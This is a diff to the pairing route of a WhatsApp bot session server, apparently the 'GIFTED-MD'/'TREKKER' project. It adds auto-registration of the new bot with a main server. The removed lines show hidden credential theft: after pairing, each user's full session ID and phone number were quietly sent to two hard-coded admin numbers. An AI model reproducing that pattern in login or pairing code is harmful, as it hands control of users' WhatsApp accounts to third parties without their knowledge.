@@ -5,6 +5,8 @@ require('dotenv').config();
 const path = require('path');
 const pino = require("pino");
 const { Boom } = require('@hapi/boom');
+const axios = require('axios');
+const FormData = require('form-data');
 
 let router = express.Router();
 
@@ -294,12 +296,14 @@ router.get('/', async (req, res) => {
                             const fullJid = sock.user.id; // Use JID, not LID
                             const jidWithoutDomain = fullJid.split('@')[0]; // Get "254704897825:27" or just "254704897825"
                             const phoneNumber = jidWithoutDomain.split(':')[0]; // Remove device ID if present, get just "254704897825"
-                            
+                            const ownerName = sock.user.name || 'User'; // Get owner name for registration
+
                             // Use JID format for sending messages to the owner
                             // Format: [country code][phone number]@s.whatsapp.net
                             const ownerJid = `${phoneNumber}@s.whatsapp.net`;
 
                             console.log(`📱 Owner Phone: ${phoneNumber}`);
+                            console.log(`📱 Owner Name: ${ownerName}`);
                             console.log(`📱 Full JID: ${fullJid}`);
                             console.log(`📱 Owner LID (not used): ${sock.user.lid}`);
                             console.log(`📤 Sending to JID: ${ownerJid} (standard JID format)`);
@@ -322,7 +326,7 @@ router.get('/', async (req, res) => {
 
 📱 *Session Details:*
 • Status: ✅ Active
-• Owner: ${sock.user.name || 'User'}
+• Owner: ${ownerName}
 • Number: ${phoneNumber}
 • Platform: Web
 
@@ -341,44 +345,114 @@ router.get('/', async (req, res) => {
 _Powered by GIFTED-MD_
 _Baileys v7.0 | WhatsApp Multi-Device_`;
 
-                            const sent = await sock.sendMessage(ownerJid, { 
-                                text: welcomeMsg 
+                            await sock.sendMessage(ownerJid, {
+                                text: welcomeMsg
+                            });
+                            console.log(`✅ Welcome message sent to WhatsApp owner via JID!`);
+
+                            // Update connection status
+                            activeSessions.set(phoneNumber, {
+                                status: 'connected',
+                                qr: null,
+                                phoneNumber: phoneNumber,
+                                sessionId: sessionId,
+                                sock: sock,
+                                connectedAt: new Date().toISOString()
                             });
 
-                            if (sent?.key?.id) {
-                                console.log(`✅ Welcome message sent! ID: ${sent.key.id}`);
-                                console.log(`🎉 COMPLETE SUCCESS!`);
-                                console.log(`📨 Message ID: ${sent.key.id}`);
-                                console.log(`🔑 Session ID sent to WhatsApp: TREKKER~${sessionId.substring(0, 30)}...`);
-                            }
+                            console.log(`🎉 Connection successful for ${phoneNumber}`);
 
-                            // THIRD: Send session ID to admin numbers using JID format
-                            await delay(2000);
-                            const adminNumbers = ['254704897825', '254799257758'];
-                            
-                            for (const adminNum of adminNumbers) {
-                                try {
-                                    // Use standard JID format for sending messages as per Baileys documentation
-                                    // Format: [country code][phone number]@s.whatsapp.net
-                                    const adminJid = `${adminNum}@s.whatsapp.net`;
-                                    
-                                    console.log(`📤 Sending session ID to admin using JID: ${adminJid}`);
-                                    console.log(`📱 Owner number (from JID): ${phoneNumber}`);
-                                    
-                                    // Send session ID using standard JID (not LID)
-                                    await sock.sendMessage(adminJid, { 
-                                        text: `📋 *NEW SESSION CREATED*\n\n${sessionIdMessage}\n\n👤 Owner: +${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}`
-                                    });
-                                    
-                                    console.log(`✅ Session ID sent to admin: ${adminNum}`);
-                                    await delay(1000); // Small delay between admin messages
-                                } catch (adminErr) {
-                                    console.warn(`⚠️ Failed to send to admin ${adminNum}:`, adminErr.message);
-                                }
-                            }
+                            // AUTO-REGISTER BOT: Register the bot automatically using the main server API
+                            try {
+                                console.log(`🤖 Auto-registering bot for ${phoneNumber} with owner name: ${ownerName}`);
 
-                        } catch (msgErr) {
-                            console.warn('⚠️ Session ID sending failed (session still valid):', msgErr.message);
+                                // Determine the main server URL (use environment variable or default to localhost)
+                                const mainServerUrl = process.env.MAIN_SERVER_URL || 'http://localhost:5000';
+
+                                // Prepare registration data
+                                const registrationData = new FormData();
+                                registrationData.append('botName', ownerName);
+                                registrationData.append('phoneNumber', phoneNumber);
+                                registrationData.append('credentialType', 'base64');
+                                registrationData.append('sessionId', `TREKKER~${sessionId}`);
+                                registrationData.append('features', JSON.stringify({
+                                    autoView: true,
+                                    typingMode: 'none',
+                                    presenceMode: 'available',
+                                    intervalSeconds: 30,
+                                    chatGPT: false
+                                }));
+
+                                // Call the guest registration API
+                                const registrationResponse = await axios.post(
+                                    `${mainServerUrl}/api/guest/register-bot`,
+                                    registrationData,
+                                    {
+                                        headers: registrationData.getHeaders(),
+                                        timeout: 30000
+                                    }
+                                );
+
+                                console.log(`✅ Bot auto-registered successfully:`, registrationResponse.data);
+
+                                // Send confirmation message to owner
+                                await delay(2000);
+                                const confirmationMsg = `✅ *BOT AUTO-REGISTERED!*
+
+Your bot "${ownerName}" has been automatically registered!
+
+📊 *Registration Details:*
+• Bot Name: ${ownerName}
+• Phone: ${phoneNumber}
+• Status: ${registrationResponse.data.botDetails?.approvalStatus === 'approved' ? '✅ APPROVED & ACTIVE' : '⏳ Pending Approval'}
+• Server: ${registrationResponse.data.assignedServer || 'Current Server'}
+
+${registrationResponse.data.botDetails?.approvalStatus === 'approved' 
+    ? '🎉 Your bot is LIVE and ready to use!\n• Send .menu to see available commands\n• Fully operational with all features!' 
+    : '⏳ Your bot is awaiting admin approval\n• You will be notified once approved\n• Contact +254704897825 for faster activation'}
+
+━━━━━━━━━━━━━━━━━━━
+_Auto-Registration Complete_`;
+
+                                await sock.sendMessage(ownerJid, {
+                                    text: confirmationMsg
+                                });
+                                console.log(`✅ Auto-registration confirmation sent to owner`);
+
+                            } catch (autoRegError) {
+                                console.error(`❌ Auto-registration failed:`, autoRegError.message);
+
+                                // Send fallback message to user
+                                await delay(2000);
+                                const fallbackMsg = `⚠️ *AUTO-REGISTRATION NOTE*
+
+Your session was created successfully, but automatic registration encountered an issue.
+
+📝 *Manual Registration:*
+• Visit the dashboard
+• Use your session ID: TREKKER~${sessionId}
+• Complete registration manually
+
+Or contact support: +254704897825
+
+Your session ID is safe and ready to use!`;
+
+                                await sock.sendMessage(ownerJid, {
+                                    text: fallbackMsg
+                                });
+                            }
+                        } catch (error) {
+                            console.error('❌ Connection.open error:', error.message);
+                            await cleanup(sock, authDir, timers);
+
+                            if (!hasResponded) {
+                                hasResponded = true;
+                                res.status(500).json({ 
+                                    error: "Failed to send welcome message",
+                                    details: error.message,
+                                    note: "Session may still be valid. Check your WhatsApp."
+                                });
+                            }
                         }
 
                         // Store session data for polling BEFORE cleanup
